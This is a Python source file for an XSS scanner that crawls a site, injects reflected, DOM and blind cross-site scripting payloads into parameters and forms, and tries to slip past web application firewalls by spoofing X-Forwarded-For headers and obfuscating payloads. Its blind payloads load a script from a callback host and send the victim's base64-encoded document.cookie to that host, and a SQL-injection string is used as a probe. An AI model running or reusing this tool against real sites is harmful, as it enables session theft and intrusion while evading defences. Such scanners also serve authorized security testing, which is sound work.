import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style
import threading
import queue
import random
import time

class XSSScanner:
    def __init__(self, threads=5, config=None):
        self.config = config or {}
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(self.config.get('user_agents', [])),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        })
        self.payloads = self._load_payloads()
        self.lock = threading.Lock()
        self.waf_detected = False

    def _load_payloads(self):
        return {
            'reflected': [
                '<script>alert(1)</script>',
                '" onmouseover=alert(1)'
            ],
            'dom': [
                '#<script>alert(1)</script>',
                'javascript:alert(1)'
            ],
            'blind': [
                '<script src="http://{callback}/xss.js"></script>',
                '<img src=x onerror="fetch(\'{callback}/log?data=\'+btoa(document.cookie))">'
            ]
        }

    def scan(self, url, crawl=False, blind_callback=None, verbose=False):
        if self._detect_waf(url):
            print(f"{Fore.YELLOW}[!] WAF Detected - Applying evasion techniques{Style.RESET_ALL}")
            self._apply_evasion()

        if crawl:
            self._crawl_and_scan(url, blind_callback, verbose)
        else:
            self._scan_url(url, blind_callback, verbose)

    def _detect_waf(self, url):
        test_payloads = ["' OR 1=1--", "<script>alert(1)</script>"]
        blocked = 0
        
        for payload in test_payloads:
            try:
                res = self.session.get(url + payload, timeout=5)
                if res.status_code == 403 or any(waf_word in res.text.lower() for waf_word in ['cloudflare', 'akamai', 'waf']):
                    blocked += 1
            except:
                continue
                
        self.waf_detected = blocked / len(test_payloads) > 0.5
        return self.waf_detected

    def _apply_evasion(self):
        self.session.headers.update({
            'X-Forwarded-For': self._random_ip(),
            'User-Agent': random.choice(self.config['user_agents'])
        })

    def _random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def _crawl_and_scan(self, start_url, blind_callback, verbose):
        url_queue = queue.Queue()
        url_queue.put(start_url)
        visited = set()

        def worker():
            while True:
                try:
                    url = url_queue.get_nowait()
                    if url not in visited:
                        visited.add(url)
                        self._scan_url(url, blind_callback, verbose)
                        
                        # Find new links
                        try:
                            res = self.session.get(url)
                            soup = BeautifulSoup(res.text, 'html.parser')
                            for link in soup.find_all('a', href=True):
                                absolute = urljoin(url, link['href'])
                                if urlparse(absolute).netloc == urlparse(start_url).netloc:
                                    url_queue.put(absolute)
                        except:
                            continue
                    url_queue.task_done()
                except queue.Empty:
                    break

        for _ in range(self.threads):
            threading.Thread(target=worker, daemon=True).start()
        url_queue.join()

    def _scan_url(self, url, blind_callback, verbose):
        # Reflected XSS
        self._test_reflected(url, verbose)
        
        # DOM XSS
        self._test_dom(url, verbose)
        
        # Blind XSS
        if blind_callback:
            self._test_blind(url, blind_callback, verbose)

    def _test_reflected(self, url, verbose):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in self.payloads['reflected']:
                if self.waf_detected:
                    payload = self._evade_payload(payload)
                
                test_url = self._build_test_url(parsed, param, payload)
                try:
                    res = self.session.get(test_url)
                    if payload in res.text:
                        self._log_vulnerability(
                            f"Reflected XSS in {param}",
                            test_url,
                            payload
                        )
                except Exception as e:
                    if verbose:
                        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    def _test_dom(self, url, verbose):
        try:
            res = self.session.get(url)
            dom_patterns = {
                'document.write': 'DOM XSS (Direct HTML Injection)',
                'innerHTML': 'DOM XSS (HTML Sink)',
                'eval(': 'DOM XSS (JS Execution)'
            }
            
            for pattern, desc in dom_patterns.items():
                if pattern in res.text:
                    self._log_vulnerability(
                        desc,
                        url,
                        self.payloads['dom'][0]
                    )
                    
                    # Test with DOM payloads
                    for payload in self.payloads['dom']:
                        test_url = urljoin(url, payload)
                        try:
                            self.session.get(test_url)
                        except:
                            continue
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] DOM scan error: {e}{Style.RESET_ALL}")

    def _test_blind(self, url, callback, verbose):
        for payload in self.payloads['blind']:
            formatted = payload.replace('{callback}', callback)
            try:
                # Test in URL
                self.session.get(url + '?test=' + formatted)
                
                # Test in forms
                res = self.session.get(url)
                soup = BeautifulSoup(res.text, 'html.parser')
                for form in soup.find_all('form'):
                    data = {inp.get('name'): formatted for inp in form.find_all('input')}
                    if form.get('method', 'get').lower() == 'post':
                        self.session.post(urljoin(url, form.get('action')), data=data)
                    else:
                        self.session.get(urljoin(url, form.get('action')), params=data)
            except Exception as e:
                if verbose:
                    print(f"{Fore.RED}[!] Blind XSS test failed: {e}{Style.RESET_ALL}")

    def _evade_payload(self, payload):
        evasions = [
            lambda x: x.replace(' ', '/**/'),
            lambda x: x.replace('=', '%3D'),
            lambda x: x.upper()
        ]
        return random.choice(evasions)(payload)

    def _build_test_url(self, parsed, param, payload):
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return parsed._replace(query="&".join(f"{k}={v[0]}" for k,v in params.items())).geturl()

    def _log_vulnerability(self, title, url, payload):
        with self.lock:
            print(f"{Fore.GREEN}[+] {title}{Style.RESET_ALL}")
            print(f"URL: {url}")
            print(f"Payload: {payload}\n")
